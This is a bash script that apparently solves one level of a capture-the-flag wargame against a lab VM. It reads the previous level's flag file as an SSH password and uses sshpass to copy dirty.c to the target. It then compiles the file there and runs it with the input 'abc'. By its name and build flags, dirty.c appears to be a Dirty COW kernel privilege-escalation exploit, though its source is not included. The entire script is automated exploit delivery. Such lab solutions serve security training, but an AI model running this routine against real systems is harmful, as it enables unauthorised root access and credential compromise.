#!/bin/bash

VM_ID='192.168.56.3'
ACTUAL_LEVEL=$(echo "$0" | grep --only --color=never --max-count=1 "level[0-9][0-9].sh" | head --lines=1 | grep --only --color=never --max-count=1 '[0-9][0-9]' | head --lines=1)

if [ -z "${ACTUAL_LEVEL}" ]; then
    echo "cannot get the level number of the actua level"
    exit 1
fi

PREVIOUS_LEVEL=$(printf %02d $(( $((10#${ACTUAL_LEVEL})) - 1)))

if [ ! -f "../../level${PREVIOUS_LEVEL}/flag" ]; then
    echo "../../level${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_level_password=$(cat "../../level${PREVIOUS_LEVEL}/flag")

sshpass -p "${act_level_password}" scp dirty.c scp://level${ACTUAL_LEVEL}@${VM_ID}:4242//tmp/dirty.c 2> /dev/null

sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cd /tmp ; gcc -pthread dirty.c -o /tmp/dirty -lcrypt' 2> /dev/null

sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "abc" | /tmp/dirty' >& /dev/null

